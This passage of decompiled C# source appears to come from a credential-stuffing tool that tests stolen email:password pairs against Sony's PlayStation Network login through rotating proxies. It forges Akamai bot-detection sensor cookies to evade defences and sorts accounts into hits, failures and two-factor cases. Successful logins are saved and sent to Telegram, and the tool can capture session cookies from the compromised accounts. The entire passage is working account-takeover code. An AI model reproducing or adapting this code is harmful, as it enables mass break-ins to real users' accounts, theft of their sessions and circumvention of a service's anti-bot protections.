								Sensor sensor = Sensor.GetRandomFromList(this.Sensors);
								if (sensor == null)
								{
									Thread.Sleep(100);
								}
								else
								{
									if (sensor.GetSensorString(true) == "STOP")
									{
										this.Stop(3);
										break;
									}
									int tries = 0;
									try
									{
										CookieContainer container = new CookieContainer();
										CookieContainer container2 = new CookieContainer();
										container2.Add(new System.Net.Cookie("_abck", "0~-1~" + Uri.UnescapeDataString(sensor.GetSensorString(true)) + "~-1~-1~-1", "/", ".sonyentertainmentnetwork.com"));
										for (;;)
										{
											int num = tries + 1;
											tries = num;
											ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
											ServicePointManager.Expect100Continue = false;
											anotherToCheck = this.GetAnotherToCheck();
											TaskAwaiter<HttpResponseMessage> taskAwaiter = this.LogIn(anotherToCheck, randomProxy, container, container2).GetAwaiter();
											if (!taskAwaiter.IsCompleted)
											{
												await taskAwaiter;
												TaskAwaiter<HttpResponseMessage> taskAwaiter2;
												taskAwaiter = taskAwaiter2;
												taskAwaiter2 = default(TaskAwaiter<HttpResponseMessage>);
											}
											HttpResponseMessage httpResponseMessage = taskAwaiter.GetResult();
											HttpResponseMessage re = httpResponseMessage;
											httpResponseMessage = null;
											ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter configuredTaskAwaiter = re.Content.ReadAsStringAsync().ConfigureAwait(false).GetAwaiter();
											if (!configuredTaskAwaiter.IsCompleted)
											{
												await configuredTaskAwaiter;
												ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
												configuredTaskAwaiter = configuredTaskAwaiter2;
												configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<string>.ConfiguredTaskAwaiter);
											}
											string text = configuredTaskAwaiter.GetResult();
											string resp = text;
											text = null;
											if (re.StatusCode != System.Net.HttpStatusCode.Forbidden && !resp.Contains("This page can't be displayed."))
											{
												if (!resp.Contains("Incorrect") && !resp.Contains("Invalid login"))
												{
													if (!resp.Contains("To sign in, an update of your account information is required") && !resp.Contains("Password expired"))
													{
														if (resp.Contains("challenge_method") && resp.Contains("\"EMAIL\""))
														{
															this._TwoStep++;
															this._Checked--;
															this.UpdateUI();
															Saver.SaveThis(string.Concat(new string[]
															{
																anotherToCheck.Split(new char[]
																{
																	':'
																})[0],
																":",
																anotherToCheck.Split(new char[]
																{
																	':'
																})[1],
																" | Proxy: ",
																randomProxy,
																" | Time: ",
																DateTime.Now.ToString()
															}), SavePath.TwoStep, null, "");
														}
														else if (resp.Contains("Login successful") || resp.Contains("npsso"))
														{
															break;
														}
													}
													else
													{
														this._Guard++;
														this._Checked--;
														this.UpdateUI();
														Saver.SaveThis(string.Concat(new string[]
														{
															anotherToCheck.Split(new char[]
															{
																':'
															})[0],
															":",
															anotherToCheck.Split(new char[]
															{
																':'
															})[1],
															" | Proxy: ",
															randomProxy,
															" | Time: ",
															DateTime.Now.ToString()
														}), SavePath.Guard, null, "");
													}
												}
												else
												{
													this._Bads++;
													this._Checked--;
													this.UpdateUI();
													Saver.SaveThis(anotherToCheck.Split(new char[]
													{
														':'
													})[0] + ":" + anotherToCheck.Split(new char[]
													{
														':'
													})[1], SavePath.Bad, null, "");
												}
											}
											else
											{
												this._CapError++;
												this.UpdateUI();
												this.Proxies.Remove(randomProxy);
												this.Accounts.Enqueue(anotherToCheck);
											}
											Application.DoEvents();
											if (re.StatusCode == System.Net.HttpStatusCode.Forbidden || re.StatusCode == System.Net.HttpStatusCode.OK || !this.CheckToContinue_Accounts() || tries >= 3 || !this._Worker)
											{
												goto IL_8F9;
											}
											container = new CookieContainer();
											if (tries != 1)
											{
												sensor.TotalUses++;
											}
										}
										this._Hit++;
										this._Checked--;
										this.UpdateUI();
										Saver.SaveThis(string.Concat(new string[]
										{
											anotherToCheck.Split(new char[]
											{
												':'
											})[0],
											":",
											anotherToCheck.Split(new char[]
											{
												':'
											})[1],
											" | Proxy: ",
											randomProxy,
											" | Time: ",
											DateTime.Now.ToString()
										}), SavePath.Good, this.activityView.Accounts_rtb, "");
										this.SentHitToTelegram(string.Concat(new string[]
										{
											anotherToCheck.Split(new char[]
											{
												':'
											})[0],
											":",
											anotherToCheck.Split(new char[]
											{
												':'
											})[1],
											" | Proxy: ",
											randomProxy,
											" | Time: ",
											DateTime.Now.ToString()
										}));
										if (this._Capthure)
										{
											CookieStorage storage = new CookieStorage(false, null);
											foreach (object obj in container.GetCookies(new Uri("https://auth.api.sonyentertainmentnetwork.com/login.jsp")))
											{
												System.Net.Cookie item = (System.Net.Cookie)obj;
												storage.Add(item);
												item = null;
											}
											IEnumerator enumerator = null;
											this.CaptureAccount(anotherToCheck, randomProxy, storage);
											storage = null;
										}
										container = null;
										container2 = null;
										continue;
										IL_8F9:;
									}
									catch (HttpException ex6)
									{
										if (ex6.HttpStatusCode == Leaf.xNet.HttpStatusCode.Forbidden)
										{
											this._CapError++;
											this.UpdateUI();
											this.Proxies.Remove(randomProxy);
											this.Accounts.Enqueue(anotherToCheck);
										}
										else if (ex6.HttpStatusCode == Leaf.xNet.HttpStatusCode.BadRequest)
										{
											this._Bads++;
											this._Checked--;
											this.UpdateUI();
											Saver.SaveThis(anotherToCheck.Split(new char[]
											{
												':'
											})[0] + ":" + anotherToCheck.Split(new char[]
											{
												':'
											})[1], SavePath.Bad, null, "");
										}
										else if (ex6.HttpStatusCode == Leaf.xNet.HttpStatusCode.Accepted)
										{
											this._TwoStep++;
											this._Checked--;
											this.UpdateUI();
											Saver.SaveThis(string.Concat(new string[]
											{
												anotherToCheck.Split(new char[]
												{
													':'
												})[0],
												":",
												anotherToCheck.Split(new char[]
												{
													':'
												})[1],
												" | Proxy: ",
												randomProxy,
												" | Time: ",
												DateTime.Now.ToString()
											}), SavePath.TwoStep, null, "");
										}
										else
										{
											this._PError++;
											this.UpdateUI();
											this.Proxies.Remove(randomProxy);
											this.Accounts.Enqueue(anotherToCheck);
											sensor.TotalUses--;
										}
									}
									catch (Exception ex7)
									{
										this._PError++;
										this.Proxies.Remove(randomProxy);
										this.Accounts.Enqueue(anotherToCheck);
										try
										{
											File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Anti-sensor check login error. ex->> " + ex7.Message + Environment.NewLine);
										}
										catch (Exception)
										{
										}
										sensor.TotalUses--;
									}
									goto IL_BE8;
								}
								continue;
							}
						}
						IL_BE8:;
					}
					catch (Exception ex8)
					{
						Exception ex9 = ex8;
						try
						{
							File.AppendAllText(Directory.GetCurrentDirectory() + "/LOG.txt", "Check, hole method exception!ex->" + ex9.ToString() + Environment.NewLine);
						}
						catch (Exception)
						{
						}
						ex9 = null;
					}
					randomProxy = null;
				}
				Application.DoEvents();
			}
		}

		// Token: 0x040000A9 RID: 169
		private string sensorPath = string.Empty;

		// Token: 0x040000AA RID: 170
		public static bool CrackLeech = true;

		// Token: 0x040000AB RID: 171
		private static Random random = new Random();

		// Token: 0x040000AC RID: 172
		private readonly UCActivityView activityView;

		// Token: 0x040000AD RID: 173
		private readonly UCSettings settings;

		// Token: 0x040000AE RID: 174
		private System.Windows.Forms.Timer _updatetimer = new System.Windows.Forms.Timer();

		// Token: 0x040000AF RID: 175
		private System.Windows.Forms.Timer processKillerTimer = new System.Windows.Forms.Timer();

		// Token: 0x040000B0 RID: 176
		private Stopwatch _timer = new Stopwatch();

		// Token: 0x040000B1 RID: 177
		private System.Windows.Forms.Timer Timer = new System.Windows.Forms.Timer();

		// Token: 0x040000B2 RID: 178
		private int gSens = 0;

		// Token: 0x040000B3 RID: 179
		private int bSens = 0;

		// Token: 0x040000B4 RID: 180
		private int sPError = 0;

		// Token: 0x040000B5 RID: 181
		private int sCapError = 0;

		// Token: 0x040000B6 RID: 182
		private int _Hit;

		// Token: 0x040000B7 RID: 183
		private int _Bads;

		// Token: 0x040000B8 RID: 184
		private int _PError;

		// Token: 0x040000B9 RID: 185
		private int _CapError;

		// Token: 0x040000BA RID: 186
		private int _Guard;

		// Token: 0x040000BB RID: 187
		private int _TwoStep;

		// Token: 0x040000BC RID: 188
		private int _CselectedInd;

		// Token: 0x040000BD RID: 189
		private int _TimeOut;

		// Token: 0x040000BE RID: 190
		private int _Checked;

		// Token: 0x040000BF RID: 191
		private int _deactiveable;

		// Token: 0x040000C0 RID: 192
		private int _undeactivable;

		// Token: 0x040000C1 RID: 193
		private int _updatetime = 0;

		// Token: 0x040000C2 RID: 194
		private bool _Worker;

		// Token: 0x040000C3 RID: 195
		private bool _Capthure = false;

		// Token: 0x040000C4 RID: 196
		private string _BOT_ID = string.Empty;

		// Token: 0x040000C5 RID: 197
		[Obfuscation(Feature = "virtualization", Exclude = false)]
		public bool actived = true;

		// Token: 0x040000C6 RID: 198
		public int LoadedCb = 0;

		// Token: 0x040000C7 RID: 199
		public int LoadedPx = 0;

		// Token: 0x040000C8 RID: 200
		public int loadedSens = 0;

		// Token: 0x040000C9 RID: 201
		private ConcurrentQueue<string> ValidatedSensorCookies = new ConcurrentQueue<string>();

		// Token: 0x040000CA RID: 202
		private bool loading = false;
	}
}
